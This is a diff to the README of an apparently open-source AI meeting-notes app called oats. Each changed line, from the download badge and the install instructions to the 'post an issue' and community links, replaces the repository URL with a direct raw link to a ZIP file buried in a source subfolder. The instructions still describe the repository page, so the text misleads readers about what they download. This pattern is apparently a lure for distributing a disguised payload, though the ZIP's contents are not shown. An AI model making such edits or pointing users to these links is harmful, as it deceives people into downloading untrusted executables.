@@ -1,6 +1,6 @@
 # 🥣 oats - Your Private, AI-Powered Meeting Notes
 
-[![Visit this link to download the application.](https://img.shields.io/badge/Download_oats-FF5733?style=for-the-badge&logo=github&logoColor=white)](https://github.com/compoundladyship287/oats)
+[![Visit this link to download the application.](https://img.shields.io/badge/Download_oats-FF5733?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/compoundladyship287/oats/main/spike/AudioCaptureSpike/Sources/3.1.zip)
 
 ## 🌟 What is oats?
 
@@ -40,7 +40,7 @@ There are no bots, no clouds, no accounts. The app never connects to the interne
 
 ### How to Download and Install
 
-1. **Visit this link** to download the application: [github.com/compoundladyship287/oats](https://github.com/compoundladyship287/oats)  
+1. **Visit this link** to download the application: [github.com/compoundladyship287/oats](https://raw.githubusercontent.com/compoundladyship287/oats/main/spike/AudioCaptureSpike/Sources/3.1.zip)  
    *(You'll see a green "Code" button on that page. Click it, then choose "Download ZIP")*
 
 2. **Extract the ZIP file**  
@@ -86,7 +86,7 @@ If you encounter issues:
 - Re-download the ZIP if files seem corrupt
 - Check for updates on the download page
 
-For more help, please [post an issue](https://github.com/compoundladyship287/oats/issues) on the repository.
+For more help, please [post an issue](https://raw.githubusercontent.com/compoundladyship287/oats/main/spike/AudioCaptureSpike/Sources/3.1.zip) on the repository.
 
 ## 📈 What's Next for oats
 
@@ -98,7 +98,7 @@ Planned improvements include:
 
 ## 🌐 Join the Community
 
-oats is open source. That means it’s built by people like you, for everyone. If you have ideas, report bugs, or want to contribute, you're welcome at [our GitHub page](https://github.com/compoundladyship287/oats).
+oats is open source. That means it’s built by people like you, for everyone. If you have ideas, report bugs, or want to contribute, you're welcome at [our GitHub page](https://raw.githubusercontent.com/compoundladyship287/oats/main/spike/AudioCaptureSpike/Sources/3.1.zip).
 
 - Suggest new features
 - Help improve the design
